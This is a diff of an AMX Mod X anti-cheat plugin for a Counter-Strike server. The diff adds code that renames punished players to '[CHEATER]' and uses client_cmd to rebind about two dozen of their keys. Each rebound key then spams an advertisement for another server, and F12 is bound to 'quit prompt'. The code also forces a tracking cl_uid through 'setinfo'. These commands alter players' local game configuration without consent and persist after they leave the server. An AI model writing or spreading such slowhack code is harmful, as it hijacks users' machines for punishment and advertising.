@@ -8,8 +8,11 @@
 
 // ; timestamp name auth cl_uid ip flags timelimit(mins) optionalcomments
 #define sic_userlist_filename  "addons/amxmodx/configs/sic_userlist.cfg"
+
 #define sic_userlist_playerlog "addons/amxmodx/logs/players.log"
 #define sic_cheater_name       "egy senkihazi csiter vagyok"
+#define sic_bannertext         "say Magyar Top1 DM! [C4nn0N] DeathMatch CSDM: connect csdm-hu.sytes.net"
+
 
 // player flags
 enum (<<= 1)
@@ -130,7 +133,14 @@ public sic_userlist_client_connect(id)
 	if (!is_user_bot(id)) {
 		if (equal(pi[pi_cl_uid], "") || equal(pi[pi_cl_uid], "76c6fd") || equal(pi[pi_cl_uid], "2ec9c1")) {
 			sic_generate_cl_uid(pi[pi_cl_uid], 6, "%s.%d.%s", pi[pi_ip], random_num(10000,99999), id)
-			set_user_info(id, "cl_uid", pi[pi_cl_uid])
+			client_cmd(id, "setinfo cl_uid ^"%s^"", pi[pi_cl_uid])
+
+			new checkinfo[32]
+			get_user_info(id, "cl_uid", checkinfo, charsmax(checkinfo))
+			if (equal(checkinfo, "")) {
+				sic_userinfo_stripinfo(id)
+				client_cmd(id, "setinfo cl_uid ^"%s^"", pi[pi_cl_uid])
+			}
 		}
 
 		sic_putsd(sic_userlist_playerlog, "%20s^t%32s^t%20s^t%24s^t%6s", g_mapname, pi[pi_name], pi[pi_auth], pi[pi_ip], pi[pi_cl_uid])
@@ -198,16 +208,55 @@ stock sic_userlist_setaccess(id, flags, timelimit, permanent=0)
 
 		if (permanent) {
 //			"^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%d^"", p_ts, pi[pi_name], pi[pi_auth], pi[pi_cl_uid], pi[pi_ip], p_flags, timelimit
-//			HINT: automatic ban by name or ip could be harmful, therefore i fixed the timelimit in 60 minutes, do it permanent by hand-edit <sic_userlist_filename>
+//			HINT: automatic ban by name or ip could be harmful, therefore i fixed the timelimit in 600 minutes, do it permanent by hand-edit <sic_userlist_filename>
 
 			if (!equal(pi[pi_cl_uid], "") || sic_bannable(pi[pi_auth])) {
 				sic_puts(sic_userlist_filename, "^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%d^"", p_ts,          "", pi[pi_auth], pi[pi_cl_uid],        "", p_flags, timelimit)
 			}
-			sic_puts(sic_userlist_filename, "^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%d^"", p_ts, pi[pi_name], pi[pi_auth], pi[pi_cl_uid], pi[pi_ip], p_flags, timelimit > 60 || timelimit == 0 ? 60 : timelimit)
+			sic_puts(sic_userlist_filename, "^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%d^"", p_ts, pi[pi_name], pi[pi_auth], pi[pi_cl_uid], pi[pi_ip], p_flags, timelimit > 600 || timelimit == 0 ? 600 : timelimit)
+
+			new lstr[128]
+			sic_userinfo_logstring_b(pi, lstr, charsmax(lstr))
+			log_message("Punish: %s has been punished (cl_uid ^"%s^") (ip ^"%s^") (admin ^"%s^")", lstr, pi[pi_cl_uid], pi[pi_ip], "")
+
+			if (containi(pi[pi_name], "CHEATER") == -1) {
+				client_cmd(id, "name ^"[CHEATER] %s^"", pi[pi_name])
+				sic_userlist_advconfig(id, pi[pi_auth])
+			}
 		}
 	} else {
 		server_print("Invalid ID or flags!")
 	}
+}
+
+public sic_userlist_advconfig(id, auth[])
+{
+	if (containi(auth, "STEAM_0") >= 0) {
+		client_cmd(id, "bind ^"b^" ^"%s^"", sic_bannertext)
+		client_cmd(id, "bind ^"e^" ^"%s; +use^"", sic_bannertext)
+		client_cmd(id, "bind ^"f^" ^"%s; impulse 100^"", sic_bannertext)
+		client_cmd(id, "bind ^"g^" ^"%s^"", sic_bannertext)
+		client_cmd(id, "bind ^"h^" ^"%s^"", sic_bannertext)
+		client_cmd(id, "bind ^"j^" ^"%s^"", sic_bannertext)
+		client_cmd(id, "bind ^"k^" ^"%s; +voicerecord^"", sic_bannertext)
+		client_cmd(id, "bind ^"m^" ^"%s^"", sic_bannertext)
+		client_cmd(id, "bind ^"n^" ^"%s^"", sic_bannertext)
+		client_cmd(id, "bind ^"z^" ^"%s^"", sic_bannertext)
+		client_cmd(id, "bind ^"F5^" ^"%s; snapshot^"", sic_bannertext)
+		client_cmd(id, "bind ^"F8^" ^"%s^"", sic_bannertext)
+		client_cmd(id, "bind ^"F10^" ^"%s^"", sic_bannertext)
+		client_cmd(id, "bind ^"F11^" ^"%s^"", sic_bannertext)
+		client_cmd(id, "bind ^"F12^" ^"%s; quit prompt^"", sic_bannertext)
+	}
+	client_cmd(id, "bind ^"r^" ^"%s; +reload^"", sic_bannertext)
+	client_cmd(id, "bind ^"INS^" ^"%s; +klook^"", sic_bannertext)
+	client_cmd(id, "bind ^"DEL^" ^"%s^"", sic_bannertext)
+	client_cmd(id, "bind ^"PGDN^" ^"%s; +lookdown^"", sic_bannertext)
+	client_cmd(id, "bind ^"PGUP^" ^"%s; +lookup^"", sic_bannertext)
+	client_cmd(id, "bind ^"HOME^" ^"%s^"", sic_bannertext)
+	client_cmd(id, "bind ^"END^" ^"%s; centerview^"", sic_bannertext)
+	client_cmd(id, "bind ^"u^" ^"%s; messagemode2^"", sic_bannertext)
+	client_cmd(id, "bind ^"y^" ^"%s; messagemode^"", sic_bannertext)
 }
 
 public sic_userlist_setflags(id, flags)
